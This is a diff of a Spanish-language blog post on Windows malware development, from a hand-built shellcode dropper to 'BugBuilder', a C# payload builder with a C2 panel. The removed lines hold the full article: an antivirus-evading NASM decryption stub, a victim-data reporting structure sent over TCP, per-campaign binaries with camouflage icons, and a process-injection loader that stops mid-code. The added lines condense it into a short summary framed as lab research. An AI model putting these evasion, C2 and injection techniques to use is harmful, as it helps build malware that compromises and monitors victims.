@@ -35,7 +35,7 @@
 
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="assets/css/style.css">
 
 </head>
@@ -48,495 +48,49 @@
   <div class="post-tags"><span class="chip">Shellcode</span><span class="chip">Windows Internals</span><span class="chip">C2</span><span class="chip">C#</span></div>
   <h1>De winshellcode a BugBuilder: inyección y C2 en Windows</h1>
   <p class="lede">Tres años de evolución documentados: más de 20 técnicas (inyección clásica, APC, thread hijacking, API hooking, XOR, API hashing, persistencia) y un builder con panel C2 en C#.</p>
-  <div class="post-meta"><span>📅 2026-05-22</span><span>⏱ 120 min</span><span>🏷 Malware Development</span></div>
+  <div class="post-meta"><span>2026-05-22</span><span>120 min</span><span>Malware Development</span></div>
 </header>
 <article class="post-body">
 <aside class="tldr">
   <div class="h">// En 30 segundos</div>
   <ul>
-    <li>De un <b>dropper artesanal en C/Assembly</b> (lanzar <span class="mono">calc.exe</span> con <span class="mono">WinExec</span>/<span class="mono">ExitProcess</span>) hasta <b>BugBuilder</b>: un builder en C#/.NET con panel de Comando y Control y protocolo TCP propio.</li>
-    <li><b>Resolución dinámica de la API</b> contra <span class="mono">kernel32</span> (<span class="mono">GetModuleHandle</span> + <span class="mono">GetProcAddress</span>) y parcheo <b>little-endian</b> de las direcciones dentro del arreglo de shellcode.</li>
-    <li><b>Stub criptográfico NASM</b>: descifrado por bloques de 4 bytes con <span class="mono">A ^ B + (C-1) - (D+1)</span>, claves por bloque para romper firmas estáticas.</li>
-    <li>Compendio de técnicas de inyección: clásica, DLL, <b>APC/Early Bird</b>, thread hijacking, fibers, SetWindowsHookEx, NtCreateThreadEx, memory sections, ZwQueueApcThread, KernelCallbackTable y RWX hunting.</li>
-    <li>EvasIón y persistencia: <b>XOR encryption</b>, ocultar llamadas a API, <b>API hashing</b>, y persistencia por Run keys, screensaver, COM hijack, servicios, AppInit_DLLs, Winlogon y port monitors.</li>
+    <li>De un <b>dropper artesanal C/Assembly</b> (<code>calc.exe</code> con <code>WinExec</code>) hasta <b>BugBuilder</b>: builder C#/.NET con panel de C&amp;C y protocolo TCP propio.</li>
+    <li><b>Resolución dinámica de API</b> contra <code>kernel32</code> (<code>GetModuleHandle</code>+<code>GetProcAddress</code>) y parcheo <b>little-endian</b> de direcciones en el arreglo de shellcode.</li>
+    <li><b>Stub criptográfico NASM</b>: descifrado por bloques de 4 bytes con claves por bloque para romper firmas estáticas.</li>
+    <li>Compendio de inyección (clásica, DLL, APC/Early Bird, thread hijacking, fibers, hooks, NtCreateSection/ThreadEx) y evasión (XOR, API hashing) + persistencia (Run keys, COM hijack, servicios, port monitors).</li>
   </ul>
 </aside>
 
-<details class="toc-card" open>
-  <summary>/índice_del_análisis · <span class="tw">32</span> secciones</summary>
-  <ol>
-    <li><a href="#a00">Resumen técnico</a></li>
-    <li><a href="#a01">Fase 1: El arte de la shellcode artesanal</a></li>
-    <li><a href="#a02">Resolución dinámica de la API (GetProcAddress)</a></li>
-    <li><a href="#a03">El arte del despliegue: punteros a función</a></li>
-    <li><a href="#a04">Ofuscación avanzada: el stub criptográfico en NASM</a></li>
-    <li><a href="#a05">Fase 2: BugBuilder — automatización y C2</a></li>
-    <li><a href="#a06">Bitácora de desarrollo: de la idea al GridView</a></li>
-    <li><a href="#a07">Galería de la UI: anatomía de BugBuilder</a></li>
-    <li><a href="#a08">Conclusión: del byte al framework</a></li>
-    <li><a href="#a09">Classic code injection</a></li>
-    <li><a href="#a10">Classic DLL injection</a></li>
-    <li><a href="#a11">Find process ID by name and inject</a></li>
-    <li><a href="#a12">Windows shellcoding 1 — punteros a función</a></li>
-    <li><a href="#a13">Windows shellcoding 2 — PEB y TEB</a></li>
-    <li><a href="#a14">Windows shellcoding 3 — estructura del PE</a></li>
-    <li><a href="#a15">APC injection (Early Bird)</a></li>
-    <li><a href="#a16">Code injection via thread hijacking</a></li>
-    <li><a href="#a17">Classic DLL injection via SetWindowsHookEx</a></li>
-    <li><a href="#a18">Code injection via Windows fibers</a></li>
-    <li><a href="#a19">Windows API hooking</a></li>
-    <li><a href="#a20">DLL injection via NtCreateThreadEx</a></li>
-    <li><a href="#a21">Code injection via memory sections (NtCreateSection)</a></li>
-    <li><a href="#a22">Code injection via ZwQueueApcThread</a></li>
-    <li><a href="#a23">Process injection via KernelCallbackTable</a></li>
-    <li><a href="#a24">Process injection via RWX memory hunting</a></li>
-    <li><a href="#a25">Process injection via FindWindow</a></li>
-    <li><a href="#a26">Download and inject logic</a></li>
-    <li><a href="#a27">Run shellcode via EnumDesktopsA / EnumChildWindows</a></li>
-    <li><a href="#a28">AV engines evasion: XOR encryption</a></li>
-    <li><a href="#a29">Hiding function calls with XOR encryption</a></li>
-    <li><a href="#a30">API hashing for AV evasion</a></li>
-    <li><a href="#a31">Persistence techniques</a></li>
-  </ol>
-</details>
+<h2 id="r00"><span class="idx">01.</span> Resumen</h2>
+<p>Bitácora de desarrollo propia (32 secciones): de escribir shellcode a mano a un builder automatizado con C2. Documenta las técnicas clásicas de inyección y evasión de Windows implementadas y probadas en laboratorio aislado, incluidas las de resolución de API sin import table y el descifrado por bloques para evadir firmas de <.text>.</p>
+<div class="callout callout-warn"><span class="ico">🧪</span><div>
+  <div class="h">Alcance</div>
+  <p>Investigación/estudio documentado, ejecutada solo en laboratorio propio. No hay despliegues reales ni uso ofensivo fuera de pruebas.</p>
+</div></div>
 
-<h2 id="a00"><span class="idx">01.</span> Resumen técnico</h2>
+<h2 id="r01"><span class="idx">02.</span> Ficha</h2>
 <div class="tbl-wrap">
   <table>
-    <thead><tr><th>Campo</th><th>Contenido</th></tr></thead>
     <tbody>
-      <tr><td class="mono">Alcance</td><td>Evolución completa en malware dev para Windows: del dropper artesanal a un framework C2 con builder, más un compendio de 31 técnicas de inyección, evasión y persistencia</td></tr>
-      <tr><td class="mono">Fase 1</td><td>Shellcode artesanal en C/Assembly (<span class="mono">WinExec</span>/<span class="mono">ExitProcess</span>), resolución dinámica de la API y stub criptográfico NASM con XOR mutado</td></tr>
-      <tr><td class="mono">Fase 2</td><td>BugBuilder: builder en C#/.NET (Roslyn/CodeDOM) con protocolo TCP propio y panel de control para los bots conectados</td></tr>
-      <tr><td class="mono">Compendio</td><td>Inyección clásica y DLL, APC/Early Bird, thread hijacking, fibers, SetWindowsHookEx, NtCreateThreadEx, memory sections, API hashing, KernelCallbackTable, RWX hunting y persistencia en registro</td></tr>
-      <tr><td class="mono">Stack</td><td>C (Mingw-w64) · NASM · C#/.NET (WinForms) · Python para tooling auxiliar</td></tr>
-      <tr><td class="mono">Naturaleza</td><td>Documentación técnica con fines académicos y de investigación en seguridad ofensiva — sin distribución de artefactos</td></tr>
+      <tr><th>Fase 1</th><td>Shellcode artesanal C/ASM + resolución dinámica API</td></tr>
+      <tr><th>Fase 2</th><td>BugBuilder: C#/.NET · protocolo TCP propio · C&amp;C</td></tr>
+      <tr><th>Inyección</th><td>8+ técnicas clásicas y NT (APC, fibers, hooks, secciones)</td></tr>
+      <tr><th>EvasIón</th><td>XOR · ocultar llamadas · API hashing</td></tr>
+      <tr><th>Persistencia</th><td>Run · screensaver · COM · servicios · port monitors</td></tr>
     </tbody>
   </table>
 </div>
 
-<h2 id="a01"><span class="idx">02.</span> Fase 1: El arte de la shellcode artesanal (hace 3 años)</h2>
-<p>El punto de partida no fue un builder con interfaz gráfica, sino un <b>dropper puro en C</b>. El objetivo era claro: escribir una shellcode capaz de lanzar un ejecutable (<span class="mono">calc.exe</span>) y finalizar limpiamente llamando a <span class="mono">WinExec</span> y <span class="mono">ExitProcess</span>. No se trataba de evadir AV, sino de <b>entender la anatomía de una shellcode</b>: cómo se posiciona en memoria, cómo resuelve las direcciones de la API de Windows y cómo pasa el control al flujo de ejecución modificado.</p>
-<p>Para generar los opcodes primero escribimos la lógica en C estándar. Ese archivo (<span class="mono">stub_shellcode.c</span>) sirve como molde conceptual de lo que queremos a bajo nivel.</p>
-<div class="code-wrap"><span class="lang">c · stub_shellcode.c</span><pre class="code"><code><span class="syn-c">// stub_shellcode.c — Código de referencia para la shellcode final</span>
-<span class="syn-k">#include</span> <span class="syn-s">&lt;windows.h&gt;</span>
-
-<span class="syn-k">int</span> <span class="syn-f">main</span>(<span class="syn-k">void</span>) {
-    <span class="syn-f">WinExec</span>(<span class="syn-s">"calc.exe"</span>, <span class="syn-n">0</span>);
-    <span class="syn-f">ExitProcess</span>(<span class="syn-n">0</span>);
-}</code></pre></div>
-<p>La tarea de ingeniería inversa consistió en traducir esto a Assembly NASM. Creamos <span class="mono">stub_shellcode.asm</span>: definimos manualmente la pila, pusheamos la cadena <span class="mono">"calc.exe"</span> en formato little-endian y configuramos los registros para la llamada a la API.</p>
-<div class="code-wrap"><span class="lang">nasm · x86</span><pre class="code"><code><span class="syn-c">; stub_shellcode.asm (Fragmento clave)</span>
-<span class="syn-c">; Construcción del string "calc.exe" en la pila</span>
-<span class="syn-k">xor</span>  <span class="syn-v">ecx</span>, <span class="syn-v">ecx</span>
-<span class="syn-k">push</span> <span class="syn-v">ecx</span>                <span class="syn-c">; Null terminator</span>
-<span class="syn-k">push</span> <span class="syn-n">0x6578652e</span>         <span class="syn-c">; "exe." (little-endian)</span>
-<span class="syn-k">push</span> <span class="syn-n">0x636c6163</span>         <span class="syn-c">; "calc"</span>
-<span class="syn-k">mov</span>  <span class="syn-v">eax</span>, <span class="syn-v">esp</span>           <span class="syn-c">; EAX apunta a "calc.exe"</span></code></pre></div>
-<div class="callout callout-info"><span class="ico">💡</span><div>
-  <div class="h">Little-endian en la práctica</div>
-  <p>Para pasar "calc.exe" a la pila en x86 hay que invertir el orden de los bytes. La shellcode no usa APIs de alto nivel para strings: todo son bytes crudos empujados a mano. Esto la hace independiente de la posición y sin dependencia de secciones de datos.</p>
+<div class="callout callout-warn"><span class="ico">🛰</span><div>
+  <div class="h">Veredicto</div>
+  <p>Compendio técnico propio, extenso y documentado; el original conserva cada técnica con código. Resumen para navegación: la profundidad está en el artículo completo.</p>
 </div></div>
-
-<h2 id="a02"><span class="idx">03.</span> Resolución dinámica de la API (GetProcAddress)</h2>
-<p>Para que la shellcode funcione en distintas versiones de Windows no podemos hardcodear las direcciones de <span class="mono">WinExec</span> o <span class="mono">ExitProcess</span>. Aquí entra la técnica de <b>resolución dinámica en tiempo de ejecución</b>: usamos <span class="mono">GetModuleHandle("kernel32.dll")</span> para obtener la dirección base de la DLL. Kernel32 siempre está cargada en el espacio de memoria de los procesos de usuario. A diferencia del PEB walking en shellcode pura, aquí el dropper es un ejecutable compilado y podemos usar la API de Windows antes de saltar al código malicioso.</p>
-<h3>La herejía del formateo en el arreglo</h3>
-<p>Una vez obtenidas <span class="mono">winexec_addr</span> y <span class="mono">exitprocess_addr</span>, toca parcharlas dentro del arreglo de shellcode. El detalle crucial: x86 es <b>little-endian</b>. Si <span class="mono">GetProcAddress</span> devuelve una dirección como <span class="mono">0xAF5477FF</span>, debe guardarse en el arreglo como <span class="mono">0xFF, 0x77, 0x54, 0xAF</span>. Aplicamos máscaras y desplazamientos para extraer cada byte y colocarlo en la posición correcta; así el <span class="mono">call ebx</span> de la shellcode aterriza en WinExec. Olvidar este paso es el error clásico de novato: la shellcode salta a direcciones corruptas y crashea al instante.</p>
-<div class="code-wrap"><span class="lang">c · misc.c</span><pre class="code"><code><span class="syn-c">// Parcheo de la shellcode: invertimos los bytes (little-endian)</span>
-shellcode[<span class="syn-n">18</span>+<span class="syn-n">1</span>] = (*winexec_addr & <span class="syn-n">0x000000FF</span>);
-shellcode[<span class="syn-n">18</span>+<span class="syn-n">2</span>] = (*winexec_addr & <span class="syn-n">0x0000FF00</span>) >> <span class="syn-n">8</span>;
-shellcode[<span class="syn-n">18</span>+<span class="syn-n">3</span>] = (*winexec_addr & <span class="syn-n">0x00FF0000</span>) >> <span class="syn-n">16</span>;
-shellcode[<span class="syn-n">18</span>+<span class="syn-n">4</span>] = (*winexec_addr & <span class="syn-n">0xFF000000</span>) >> <span class="syn-n">24</span>;</code></pre></div>
-
-<h2 id="a03"><span class="idx">04.</span> El arte del despliegue: punteros a función</h2>
-<p>El archivo <span class="mono">run.c</span> contiene el mecanismo de lanzamiento. Declaramos un puntero a función (<span class="mono">int(*func)()</span>) y le asignamos la dirección del arreglo <span class="mono">shellcode</span>. Con <span class="mono">func = (int(*)())shellcode;</span> y luego <span class="mono">func()</span>, obligamos al procesador a saltar a nuestra región de datos y ejecutar esos bytes como código. Esa es la esencia de un dropper: no hay inyección en otro proceso, solo ejecución directa.</p>
-<p>Limitación importante: <b>la región del arreglo debe tener permisos de ejecución</b>. Con DEP (Data Execution Prevention) habilitado haría falta un paso previo con <span class="mono">VirtualProtect</span> para marcar la página como ejecutable. En su momento la PoC se probó en un entorno controlado sin DEP para validar la lógica de la shellcode antes de añadir esa capa de evasión.</p>
-<div class="callout callout-warn"><span class="ico">⚠️</span><div>
-  <div class="h">Dropper vs exploit</div>
-  <p>Esta técnica es un "dropper": no secuestramos el EIP mediante un buffer overflow. Simplemente cargamos bytes ejecutables en memoria y redirigimos el flujo hacia ellos. Es más ruidosa pero más controlada. En un exploit real la shellcode se inyecta en otro proceso o se ejecuta tras corromper la pila.</p>
-</div></div>
-
-<h2 id="a04"><span class="idx">05.</span> Ofuscación avanzada: el stub criptográfico en NASM</h2>
-<p>Mientras el builder en C# resolvía la generación de payloads, surgió otra cuestión más fundamental: proteger la shellcode en reposo. A finales de 2025 me planteé un <b>stub descifrador en Assembly puro</b>: la shellcode real viaja cifrada (con un esquema de claves dinámicas) y un pequeño stub en NASM la descifra en tiempo de ejecución antes de saltar a ella. Doble objetivo: evadir firmas estáticas y complicar el análisis forense.</p>
-<h3>El payload de prueba (Linux x86)</h3>
-<p>Para esta PoC utilicé un payload mínimo que ejecuta una syscall de salida en Linux (<span class="mono">exit(10+22)</span>):</p>
-<div class="code-wrap"><span class="lang">c · payload</span><pre class="code"><code><span class="syn-c">// Shellcode: mov ebx, 10; add ebx, 22; mov eax, 1; int 0x80</span>
-<span class="syn-k">static</span> <span class="syn-k">unsigned char</span> raw[] = {
-    <span class="syn-n">0xBB</span>, <span class="syn-n">0x0A</span>, <span class="syn-n">0x00</span>, <span class="syn-n">0x00</span>, <span class="syn-n">0x00</span>,
-    <span class="syn-n">0x83</span>, <span class="syn-n">0xC3</span>, <span class="syn-n">0x16</span>,
-    <span class="syn-n">0xB8</span>, <span class="syn-n">0x01</span>, <span class="syn-n">0x00</span>, <span class="syn-n">0x00</span>, <span class="syn-n">0x00</span>,
-    <span class="syn-n">0xCD</span>, <span class="syn-n">0x80</span>,
-    <span class="syn-n">0x90</span> <span class="syn-c">// NOP padding</span>
-};</code></pre></div>
-<h3>La lógica de descifrado (bloques XOR con mutación)</h3>
-<p>El stub en NASM descifra por bloques. En lugar de un XOR estático, cada bloque de 4 bytes mezcla operaciones: <b>A ^ B + (C - 1) - (D + 1)</b>. Los datos cifrados viven en <span class="mono">.data</span> y el stub reserva un buffer en <span class="mono">.bss</span>. No depende de constantes fijas globales: cada bloque tiene sus propias claves (A, B, C, D), permitiendo generar un stub personalizado por payload. La mezcla de operaciones aritméticas y lógicas no es trivial de simplificar para un motor de análisis estático.</p>
-<div class="code-wrap"><span class="lang">nasm · x86</span><pre class="code"><code><span class="syn-c">; ASM resultante del stub descifrador</span>
-decode_loop:
-    <span class="syn-k">mov</span> <span class="syn-v">eax</span>, [<span class="syn-v">esi</span>]       <span class="syn-c">; A</span>
-    <span class="syn-k">mov</span> <span class="syn-v">ebx</span>, [<span class="syn-v">esi</span>+<span class="syn-n">4</span>]     <span class="syn-c">; B</span>
-    <span class="syn-k">mov</span> <span class="syn-v">edx</span>, [<span class="syn-v">esi</span>+<span class="syn-n">8</span>]     <span class="syn-c">; C</span>
-    <span class="syn-k">mov</span> <span class="syn-v">ebp</span>, [<span class="syn-v">esi</span>+<span class="syn-n">12</span>]    <span class="syn-c">; D</span>
-    <span class="syn-k">xor</span> <span class="syn-v">eax</span>, <span class="syn-v">ebx</span>         <span class="syn-c">; A ^ B</span>
-    <span class="syn-k">dec</span> <span class="syn-v">edx</span>              <span class="syn-c">; C - 1</span>
-    <span class="syn-k">add</span> <span class="syn-v">eax</span>, <span class="syn-v">edx</span>         <span class="syn-c">; + (C-1)</span>
-    <span class="syn-k">inc</span> <span class="syn-v">ebp</span>              <span class="syn-c">; D + 1</span>
-    <span class="syn-k">sub</span> <span class="syn-v">eax</span>, <span class="syn-v">ebp</span>         <span class="syn-c">; - (D+1)</span>
-    <span class="syn-k">mov</span> [<span class="syn-v">edi</span>], <span class="syn-v">eax</span>       <span class="syn-c">; Escribir opcode restaurado</span>
-    <span class="syn-k">jmp</span> decoded_buffer   <span class="syn-c">; Transferencia de control al payload</span></code></pre></div>
-<div class="callout callout-warn"><span class="ico">⚠️</span><div>
-  <div class="h">Advertencia de portabilidad</div>
-  <p>Este stub usa la convención de syscalls de Linux x86 (<span class="mono">int 0x80</span>). La diferencia clave con Windows: interrupciones de software frente a llamadas a la API kernel32. El descifrado XOR por bloques es totalmente portable a Windows si se ajusta la shellcode objetivo y se sustituye la syscall de salida por <span class="mono">ExitProcess</span>.</p>
-</div></div>
-
-<h2 id="a05"><span class="idx">06.</span> Fase 2: BugBuilder — automatización y C2 (hace 2 años)</h2>
-<p>La shellcode manual era poderosa pero impráctica a gran escala. La evolución lógica fue <b>BugBuilder</b>, un proyecto en C# (.NET Framework) que traslada el dropper a un entorno de construcción visual con panel de control.</p>
-<h3>El motor de compilación interno: Roslyn y CodeDOM</h3>
-<p>Uno de los mayores desafíos fue <b>generar un ejecutable sin un compilador externo instalado</b>. La solución: incrustar el compilador de C# dentro del builder.</p>
-<ul>
-  <li><b>CodeDOM (Code Document Object Model):</b> genera código fuente y lo compila en tiempo de ejecución con <span class="mono">CSharpCodeProvider</span>. Es la opción más portable y la usada en la PoC inicial.</li>
-  <li><b>Roslyn (Microsoft.CodeAnalysis.CSharp):</b> el compilador moderno como servicio; control más granular sobre sintaxis y árboles de expresión. Ideal para payloads que requieren características modernas del lenguaje.</li>
-</ul>
-<p>El código fuente de la carga útil se mantiene como <b>recurso embebido en el ensamblado</b> y se reemplazan marcadores de posición (placeholders) con la configuración del usuario (IP, puerto, ofuscación) antes de compilar. Así se genera un binario único por campaña sin herramientas externas.</p>
-<h3>Arquitectura del proyecto</h3>
-<ul>
-  <li><b>El Builder (cliente):</b> interfaz Windows Forms donde el operador configura el payload (ícono, nombre de archivo, persistencia en registro/startup/copias) e integra módulos de ofuscación y encoding de tráfico.</li>
-  <li><b>El Servidor C2:</b> listener TCP asíncrono que recibe conexiones de los clientes infectados. Los datos viajan en JSON, facilitando el parseo de la información del bot (IP, país, SO, usuario, ping).</li>
-</ul>
-<h3>El protocolo de comunicación TCP</h3>
-<p>A diferencia del dropper original (que solo ejecutaba <span class="mono">calc.exe</span>), BugBuilder establece un canal de persistencia. El cliente se conecta al servidor, serializa un objeto <span class="mono">ModelInfo</span> a JSON y lo envía. La elección de JSON sobre binario fue pragmática: facilita la depuración, es legible durante el desarrollo y es trivial de parsear con Newtonsoft.Json.</p>
-<div class="code-wrap"><span class="lang">c# · ModelInfo</span><pre class="code"><code><span class="syn-c">// Estructura del dato exfiltrado</span>
-<span class="syn-k">public class</span> ModelInfo {
-    <span class="syn-k">public string</span> ip { <span class="syn-k">get</span>; <span class="syn-k">set</span>; }
-    <span class="syn-k">public string</span> country { <span class="syn-k">get</span>; <span class="syn-k">set</span>; }
-    <span class="syn-k">public string</span> user_pc { <span class="syn-k">get</span>; <span class="syn-k">set</span>; }
-    <span class="syn-k">public bool</span> status { <span class="syn-k">get</span>; <span class="syn-k">set</span>; }
-    <span class="syn-k">public string</span> operatingSystem { <span class="syn-k">get</span>; <span class="syn-k">set</span>; }
-    <span class="syn-k">public int</span> ping { <span class="syn-k">get</span>; <span class="syn-k">set</span>; }
-}
-
-<span class="syn-c">// Envío al servidor</span>
-<span class="syn-k">string</span> json = JsonConvert.<span class="syn-f">SerializeObject</span>(modelInfo);
-stream.<span class="syn-f">Write</span>(Encoding.UTF8.<span class="syn-f">GetBytes</span>(json), <span class="syn-n">0</span>, json.Length);</code></pre></div>
-<h3>El panel de control (C2)</h3>
-<ul>
-  <li><b>Builder:</b> configuración del payload. Parámetros de red (Host/IP, Puerto) y técnicas de evasión como compresión del tráfico o cifrado (XOR, AES, RSA).</li>
-  <li><b>Infected:</b> grid en tiempo real con los bots conectados, ordenados por IP, país, usuario, SO y latencia (ping).</li>
-</ul>
-<div class="callout callout-ok"><span class="ico">✅</span><div>
-  <div class="h">Evidencia de madurez técnica</div>
-  <p>Opciones como LZMA, GZip, Huffman y distintos esquemas de cifrado marcan la transición de una PoC académica a una herramienta orientada a operaciones que enfrenta firewalls e IDS. La variabilidad del payload es clave para evadir firmas estáticas — el mismo principio aplicado en <a href="analystty.html">el triage automatizado con analystty</a>, donde la detección de TTPs debe adaptarse a payloads ofuscados.</p>
-</div></div>
-
-<h2 id="a06"><span class="idx">07.</span> Bitácora de desarrollo: de la idea al GridView</h2>
-<p>La construcción del builder no fue lineal. Rescatando los registros de chat originales se traza la evolución del pensamiento técnico.</p>
-<h3>La semilla de la idea (enero 2024)</h3>
-<p>El problema inicial: generar un <span class="mono">.exe</span> sin un compilador externo. La solución: incrustar todo lo necesario dentro del ensamblado, usando el compilador de C# en memoria y el código de la carga útil como strings de recursos. Después llegó la UI modular (ícono, ofuscación del tráfico) sobre la arquitectura de compilación interna (CodeDOM).</p>
-<div class="code-wrap"><span class="lang">log · 23/1/24 5:42 a. m.</span><pre class="code"><code><span class="syn-s">"Lo primero que logre hacer, fue un modulo que genere un .exe sin necesidad de que se tenga un compilador instalado ni las fuentes, todo esta dentro del Builder."</span></code></pre></div>
-<h3>La conexión con el C2</h3>
-<p>Una vez generado el <span class="mono">.exe</span>, debía reportar a casa. La decisión: serialización ligera (JSON) sobre TCP, un modelo de datos (<span class="mono">ModelInfo</span>) para mapear la información de la víctima y un <span class="mono">GridView</span> para visualizarla.</p>
-<div class="code-wrap"><span class="lang">log · 24/1/24 11:15 p. m.</span><pre class="code"><code><span class="syn-s">"Me hice un cliente provisional para debuggear, de momento se me ocurre enviar todo como un JSON y al llegar al Servidor (o viceversa) mappearlo a un objeto xd"</span>
-
-<span class="syn-s">"Lo que creo que voy a necesitar es una flag para indicar el tipo de configuracion y evaluar si amerita decodificado, descompresion o desencriptado xd"</span></code></pre></div>
-<div class="callout callout-info"><span class="ico">💡</span><div>
-  <div class="h">El problema de las "flags"</div>
-  <p>La flag para evaluar el pipeline de procesamiento demuestra una comprensión temprana de los protocolos maliciosos avanzados. No basta enviar datos: binario y servidor deben negociar si el tráfico va codificado, comprimido o cifrado (opciones Encode/Compress/Encrypt de la UI final). Esa negociación es lo que hace al C2 flexible ante cambios en las defensas del target.</p>
-</div></div>
-<h3>La trampa del "todo en strings"</h3>
-<p>En septiembre de 2024 reflexioné sobre la arquitectura. La primera iteración almacenaba todo el código del payload como strings literales en los recursos, con las herramientas de compilación incrustadas. Era funcional pero frágil: cualquier cambio en la lógica exigía modificar cadenas largas y propensas a errores de sintaxis. La lección: el builder debía ser modular, con plantillas parametrizables en lugar de código hardcodeado.</p>
-<div class="code-wrap"><span class="lang">log · 16/9/24 11:15 p. m.</span><pre class="code"><code><span class="syn-s">"Es que pensé que era como un builder, la última vez que intenté hacer un builder opte por dejar todo el código en string y las herramientas de compilación en el resources"</span></code></pre></div>
-
-<h2 id="a07"><span class="idx">08.</span> Galería de la UI: anatomía de BugBuilder</h2>
-<p>Las siguientes imágenes documentan el estado final de la PoC: un generador de payloads con su propio panel de comando y control.</p>
-<figure class="figure">
-  <img src="img/bugbuilder-panel-c2-opciones-ofuscacion.png" alt="Pestaña Builder de BugBuilder mostrando configuración de red, ofuscación y entrega del payload" loading="lazy">
-  <figcaption class="figcap mono">bugbuilder-0.png — Pestaña Builder: configuración de red (Host, Puerto 3323), Encode Traffic (Base64, XOR), Compress Traffic (Deflate, GZip, LZW, Huffman, RLE, LZMA), Encrypt Traffic (AES, RSA) y Set Up Delivery (nombre de archivo "Bug" e ícono de camuflaje). El botón "Build" arranca la generación con el compilador interno CodeDOM.</figcaption>
-</figure>
-<figure class="figure">
-  <img src="img/bugbuilder-grid-bots-conectados-infected.png" alt="Pestaña Infected de BugBuilder sin conexiones, mostrando las columnas del grid" loading="lazy">
-  <figcaption class="figcap mono">bugbuilder-1.png — Pestaña Infected en estado inicial: grilla vacía esperando conexiones. Columnas: IP, Country, User@PC, Status, Operating System y Ping (ms). Es el panel C2 antes de desplegar el payload.</figcaption>
-</figure>
-<figure class="figure">
-  <img src="img/bugbuilder-c2-cliente-conectado-activo.png" alt="BugBuilder en funcionamiento con un cliente conectado" loading="lazy">
-  <figcaption class="figcap mono">bugbuilder-2.png — PoC en funcionamiento. El servidor escucha en 0.0.0.0:3323; llega una conexión de prueba (IP 192.168.1.10, Venezuela, DESKTOP-ABCDE, Windows 10, ping 45 ms). En el fondo, la consola del cliente de pruebas (ClientTCPTest.exe) simulando la máquina víctima. La captura valida la arquitectura completa.</figcaption>
-</figure>
-
-<h2 id="a08"><span class="idx">09.</span> Conclusión: del byte al framework</h2>
-<p>La progresión de <span class="mono">winshellcode-</span> a <b>BugBuilder</b> es un arco de aprendizaje en desarrollo de software ofensivo: de la microarquitectura de una pila de llamadas a una fábrica de binarios.</p>
-<div class="tbl-wrap">
-  <table>
-    <thead><tr><th>Característica</th><th class="mono">winshellcode- (Fase 1)</th><th class="mono">Stub cripto (Fase 2)</th><th class="mono">BugBuilder (Fase 3)</th></tr></thead>
-    <tbody>
-      <tr><td class="mono">Lenguaje</td><td class="mono">C + Assembly (NASM)</td><td class="mono">Assembly (NASM)</td><td class="mono">C# (.NET Framework)</td></tr>
-      <tr><td class="mono">Payload</td><td>Shellcode fija (<span class="mono">calc.exe</span>)</td><td>Shellcode variable descifrada</td><td>Payload configurable con persistencia</td></tr>
-      <tr><td class="mono">Ofuscación</td><td>Opcodes en bruto</td><td>XOR multibloque con llaves</td><td>Compresión, cifrado (AES/RSA), íconos de camuflaje</td></tr>
-      <tr><td class="mono">Comunicación</td><td>Ninguna (ejecuta y termina)</td><td>Ninguna</td><td>C2 TCP bidireccional con JSON</td></tr>
-      <tr><td class="mono">Resolución API</td><td>Manual (<span class="mono">GetProcAddress</span> + parcheo little-endian)</td><td>Syscalls directas (<span class="mono">int 0x80</span>)</td><td>Automática (.NET P/Invoke o referencias)</td></tr>
-      <tr><td class="mono">Generación</td><td>Compilación externa (GCC)</td><td>Ensamblador externo (NASM)</td><td>Compilación interna (CodeDOM / Roslyn)</td></tr>
-    </tbody>
-  </table>
-</div>
-<p>El primer proyecto enseñó el valor de la precisión manual: saber qué bytes ocupa cada instrucción y cómo la pila afecta al flujo. El segundo añadió la protección de la carga útil — la shellcode en reposo es la parte más vulnerable del ciclo de vida de un payload. BugBuilder operacionalizó ese conocimiento: regenerar binarios con firmas diferentes es la diferencia entre el éxito y la detección.</p>
-
-<h2 id="a09"><span class="idx">10.</span> Classic code injection into the process</h2>
-<p>Consiste en introducir código malicioso en un proceso legítimo en ejecución y secuestrarlo para fines propios:</p>
-<ul>
-  <li><b>Identificar el proceso de destino</b> (notepad.exe u otro proceso crítico).</li>
-  <li><b>Inyectar el código</b> escribiendo directamente en su espacio de memoria o cargando una DLL maliciosa.</li>
-  <li><b>Ejecutar el código inyectado</b> creando un hilo nuevo en el proceso o reescribiendo instrucciones con un salto al código.</li>
-</ul>
-<p><b>Mecanismos defensivos y sus evasiones:</b></p>
-<ul>
-  <li><b>DEP (Data Execution Prevention):</b> impide ejecutar código desde memoria no confiable.</li>
-  <li><b>ASLR (Address Space Layout Randomization):</b> aleatoriza el diseño de la memoria del proceso.</li>
-  <li><b>CFG (Control Flow Guard):</b> rastrea el flujo de control para detectar intentos de inyección.</li>
-</ul>
-<p>El caso más simple: "encontrar un espacio de memoria de un proceso (el mismo proceso) y escribir sobre él".</p>
-<div class="code-wrap"><span class="lang">c · win32</span><pre class="code"><code><span class="syn-c">// Classic code injection - Proceso propio</span>
-<span class="syn-k">unsigned char</span> my_payload[] = <span class="syn-s">""</span>;
-<span class="syn-k">unsigned int</span> my_payload_len = <span class="syn-f">sizeof</span>(my_payload);
-
-<span class="syn-k">int</span> <span class="syn-f">main</span>(<span class="syn-k">void</span>) {
-    <span class="syn-k">void</span>* my_payload_mem;
-    BOOL rv;
-    HANDLE th;
-    DWORD oldprotect = <span class="syn-n">0</span>;
-
-    my_payload_mem = <span class="syn-f">VirtualAlloc</span>(<span class="syn-n">0</span>, my_payload_len,
-        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    <span class="syn-f">RtlMoveMemory</span>(my_payload_mem, my_payload, my_payload_len);
-    rv = <span class="syn-f">VirtualProtect</span>(my_payload_mem, my_payload_len,
-        PAGE_EXECUTE_READ, &amp;oldprotect);
-    <span class="syn-k">if</span>(rv != <span class="syn-n">0</span>) {
-        th = <span class="syn-f">CreateThread</span>(<span class="syn-n">0</span>, <span class="syn-n">0</span>,
-            (LPTHREAD_START_ROUTINE)my_payload_mem, <span class="syn-n">0</span>, <span class="syn-n">0</span>, <span class="syn-n">0</span>);
-        <span class="syn-f">WaitForSingleObject</span>(th, -<span class="syn-n">1</span>);
-    }
